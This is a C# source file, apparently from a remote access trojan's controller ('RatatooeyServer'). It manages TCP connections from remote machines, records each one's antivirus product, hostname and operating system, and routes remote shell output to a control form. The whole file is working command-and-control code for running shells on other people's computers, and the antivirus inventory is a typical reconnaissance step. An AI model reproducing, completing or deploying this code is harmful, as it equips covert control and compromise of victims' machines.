using ProtoBuf;
using RatatooeyServer.Helpers;
using RatatooeyServer.ProtoMessages;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RatatooeyServer.Server
{
	public class Client 
	{
		private NetworkStream _stream;
		private TcpClient _client;
		private bool _identified;
		private Server _server;
		public NetworkStream Stream { get { return _stream; } }

		public ClientData data = new ClientData();

		public bool Identified
		{
			get { return _identified; }

			set { _identified = value; } 
		}

		public Client(TcpClient client, IPEndPoint endPoint, Server server)
		{
			_server = server;
			_client = client;
			// fix that
			_stream = client.GetStream();
			data.IP = endPoint;
			_identified = false;
		}

        public bool Equals(Client other)
		{
			if (ReferenceEquals(null, other)) return false;
			if (ReferenceEquals(this, other)) return true;

			try
			{
				return this.data.IP.Port.Equals(other.data.IP.Port);
			}
			catch (Exception)
			{
				return false;
			}
		}

		public override int GetHashCode()
		{
			return this.data.IP.GetHashCode();
		}



		public void SendData(IMessage message)
		{
			//try
			//{
			using (MemoryStream ms = new MemoryStream())
			{
				if (!_client.Connected)
				{
					Disconnect();
					return;
				}
				Serializer.Serialize(ms, message);
				byte[] payload = ms.ToArray();
				byte[] length = BitConverter.GetBytes(payload.Length);
				Stream.Write(length, 0, length.Length);
				Stream.Write(payload, 0, payload.Length);

			}
			//}
			//catch (Exception ex)
			//{
			//	Console.WriteLine($"Error sending message: {ex.Message}");
			//}
		}

		public void StartReceiving()
		{
			Task.Run(() => ReceiveData());
		}

		public void ReceiveData()
		{
			//try
			//{
				while (_client.Connected)
				{
					// Read message length
					byte[] lengthBuffer = new byte[4];
					int bytesRead = _stream.Read(lengthBuffer, 0, lengthBuffer.Length);

					if (bytesRead == 0)
					{
						// No data received, client may have disconnected
						Console.WriteLine("No data received. Client may have disconnected.");
						break;
					}

					int messageLength = BitConverter.ToInt32(lengthBuffer, 0);

					// Read message data
					byte[] messageBuffer = new byte[messageLength];
					bytesRead = 0;
					while (bytesRead < messageLength)
					{
						bytesRead += _stream.Read(messageBuffer, bytesRead, messageLength - bytesRead);
					}

					// Deserialize message
					IMessage message = null;
					using (MemoryStream ms = new MemoryStream(messageBuffer))
					{
						message = Serializer.Deserialize<IMessage>(ms);
					}

					// Process message
					ProcessMessageFromServer(message);
				}
			Disconnect();
			//}
			//catch (Exception ex)
			//{
			//	Console.WriteLine($"Error receiving message from server: {ex.Message}");
			//}
		}

		private void ProcessMessageFromServer(IMessage message)
		{
			if (!Identified & (message is InitialData))
			{ 
				InitialData initialData = (InitialData)message;
				data.AV = initialData.AV;
				data.Hostname = initialData.ComputerName;
				data.OS = initialData.OS;

				// Assuming you have a method to add clients to a list
				_server.AddClient(this);
			}
			switch (message)
			{
				case MsgBox msg:
					MessageBox.Show(msg.Text);
					break;

				case RemoteShellResponse msg:
					foreach (Form x in Application.OpenForms)
					{
						if (x is RemoteShellForm && x.Tag == this)
							x.Invoke((MethodInvoker)delegate{((RemoteShellForm)x).handle(msg); });
					}
					break;
			}
		}

		public void Disconnect()
		{
			if (_client != null)
			{
				foreach (Form x in Application.OpenForms)
				{
					if (x is FormServer)
					{
						x.Invoke((MethodInvoker)delegate { ((FormServer)x).RemoveClientList(this); });
						x.Invoke((MethodInvoker)delegate { MessageBox.Show(x, "Client " + this.data.IP.ToString() + " | " + this.data.Hostname.ToString() + " disconected", "Info"); }); 
						
					}
					else if (x is RemoteShellForm)
						x.Invoke((MethodInvoker)delegate { ((RemoteShellForm)x).Dispose(); });

				}
				
				Stream.Close();
				_client.Close();
			}
		}

	}
}
